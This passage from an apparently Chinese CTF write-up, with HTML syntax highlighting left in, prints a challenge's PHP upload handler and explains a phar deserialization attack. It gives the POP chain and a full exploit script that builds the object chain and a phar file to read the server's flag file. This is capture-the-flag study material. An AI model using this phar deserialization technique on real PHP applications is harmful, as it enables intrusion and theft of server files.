class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777);</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">upload_file_check</span>()) &#123;<br>        <span class="hljs-title function_ invoke__">upload_file_do</span>();<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>);<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123;<br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>快速介绍下：先上传文件在通过phar协议即可拿到flag，upload.php上传的文件(白名单)会经过修改名字，上传到upload的目录，平且后缀只为.jpg（文件名的话可以访问upload就可以现实文件名，文件名也可以自己算出来没懂为如何算），然后在file.php中用phar协议读取上传文件，关键在于如何在class.php构造pop链</p><p>快速接受pop链如何构成：</p><p>Test：：file_get()&lt;–Test：：get()&lt;–Test：：__get()&lt;–Show：：<code>__toString()</code>&lt;–C1e4r：：<code>__destruct()</code></p><h5 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h5><p>没想到phar协议可以解析.jpg后缀说明，phar不是通过后缀判断，可能是通过内容</p><p>完整exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;       <span class="hljs-comment">//  3  赋值为Show类对象</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;        <span class="hljs-comment">//  2 str中的键名str赋值为Test类对象</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;     <span class="hljs-comment">// 1  赋值为[&#x27;source&#x27; =&gt; &#x27;/var/www/html/f1ag.php&#x27;]</span><br>&#125;<br> <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>;<br><span class="hljs-variable">$a</span>-&gt;params=[<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;/var/www/html/f1ag.php&#x27;</span>];<br><span class="hljs-comment">//如果直接赋值为f1ag.php没有作用</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//也可以$b-&gt;str=[&#x27;str&#x27;=&gt;$a];</span><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>;<br><span class="hljs-variable">$c</span>-&gt;str=<span class="hljs-variable">$b</span>;<br><br><span class="hljs-keyword">or</span><br>    <br><span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$m</span>-&gt;str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$m</span>-&gt;str-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$m</span>-&gt;str-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;params[<span class="hljs-string">&quot;source&quot;</span>]=<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;<br> <br><span class="hljs-comment">//前面是构造的序列化字符串,后面是生成phar文件</span><br> <br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar,前面名称随意</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$c</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
